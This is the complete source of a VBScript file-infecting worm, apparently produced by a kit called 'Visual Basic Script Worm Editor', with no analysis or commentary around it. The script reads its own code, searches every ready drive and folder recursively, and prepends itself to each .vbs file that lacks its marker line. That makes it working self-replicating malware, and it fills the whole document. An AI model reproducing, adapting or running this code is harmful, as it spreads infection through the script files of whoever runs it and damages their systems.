'MVBSWE
set mvbswe = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
Self = OpenSelf.Readall
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then
Set Scripts = FSO.OpenTextFile(File.path, 1, True)
If Scripts.ReadLine <> "'MVBSWE" then
Set Scripts = FSO.OpenTextFile(File.path, 1, True)
ScriptsSource = Scripts.ReadAll
Set WriteScripts = FSO.OpenTextFile(File.path, 2, True)
WriteScripts.WriteLine Self
WriteScripts.WriteLine ScriptsSource
end if
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next
end function
'Generated with Microsoft Visual Basic Script Worm Editor [MVBSWE]